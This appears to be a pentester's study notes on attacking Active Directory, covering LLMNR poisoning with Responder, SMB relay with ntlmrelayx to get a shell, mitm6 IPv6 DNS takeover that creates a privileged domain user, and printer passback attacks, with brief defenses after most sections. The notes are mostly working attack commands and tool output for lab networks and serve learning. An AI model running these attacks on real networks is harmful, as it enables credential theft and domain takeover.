### Attacking Active Directory

- [password cracking](/password_cracking/README.md)
- [Adam Toscher - Top 5 ways](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)

#### LLMNR Poisoning
- Link Local multicast name resoluton
- NETBIOS / DNS
- MITM Type Attack - We respond to the request
- The issue is that username and hash are given with correct response
- Tools
    - Impacket / Responder [Start before nmap and nessus scan]
 


##### LLMNR Poisoning Defense
- Turn off Multicast name resolution 
```
[Local Computer Policy  / Computer Config / Admin Templatesd / Network / DNS Client]
```
- Disable NBT-NS
```
[Network Adapter Properties / TCP Properties / Advanced / Wins / Disable Netbios over TCP/IP ]
```
    Else:
        - Require Network Access Control
        - Strong Passwords



#### Capture NTMLv2 hashes with Responder
```bash
sudo responder -I eth0 -dw 
```

#### SMB Relay Attacks
Instead of cracking hashes, relay credentials instead
- SMB signing needs to be off
- Relayed creds must be admin on machine


```bash
/etc/responder/Responder.conf # SMB = Off / HTTP = Off
python ntlmrelayx.py -ft targets.txt -smb2support
```

> SAM Hashes
Local user hashes / Windows version of ```/etc/passwd``` for local users

#### Discovering Hosts with SMB signing disabled
> Defaults

- Local machines = Off
- Servers = On

> Find via

- nessus scan
- nmap

```bash
sudo nmap --script=smb2-security-mode -p 445 192.168.131.0/24
```

#### Gaining Shell

```
sudo responder -I eth0 -dw
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
sudo nc 127.0.0.1 11000
```

```bash
msfconsole/windows/smb/psexec
    execute -f cmd.exe -i -H

```

### Mitigation
- Enable SMB signing
- Disable NTLM auth
- limit domain / local admins
- LDAP relay
- MiTM6
- difficult to detect




#### IPv6 DNS Takeover

- More reliable
- Probable IPv6 DNS hole
- Authentication to DC via LDAP
- [mitm6:](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
- [Combining NTLM Relays and Kerberos Delegation:](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)

```bash
ntlmrelayx.py -6 -t ldaps://192.168.131.131 -wh fakewpad.basejump.local -l lootme

sudo git clone https://github.com/dirkjanm/mitm6 /opt/mitm6
sudo python3 mitm6.py -d basejump.local

sudo ntlmrelayx.py -6 -t ldaps://192.168.131.131 -wh fakewpad.basejump.local -l lootme

sudo python3 mitm6.py -d basejump.local
```
> Output
```
[*] Adding new user with username: YLzmriDGhj and password: ,JtM/MDi:z1G+OO result: OK
[*] Querying domain security descriptor
[*] Success! User YLzmriDGhj now has Replication-Get-Changes-All privileges on the domain

```

#### IPv6 Attack Defenses

- Disable WPAD WinHttpAutoProxySvc service
- LDAP signing / LDAPS channel binding
- Block Admin Delegation


#### Passback attack
Looking for access to LDAP / SMB / SMTP / Other connections of peripherials

- [Passback attack](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/)
- MFPs = Multi-Function Peripherials [printers]
- Management Pages - LDAP Server = $(AttackingIP)

### Other vectors & approaches

- Start with MitM6 or Responder
- Nessus & nmap scan
    - SMB signing not active
- Run scans and generate traffic
- Listen for clear text creds on other systems
    - phone systems
    - Copier scanner
- Look for Websites [metasploit / http_version]
- Default Logins
    - Printers [scan to computer with admin rights]
    - Work flow applications
- Find unique / unusual methods in





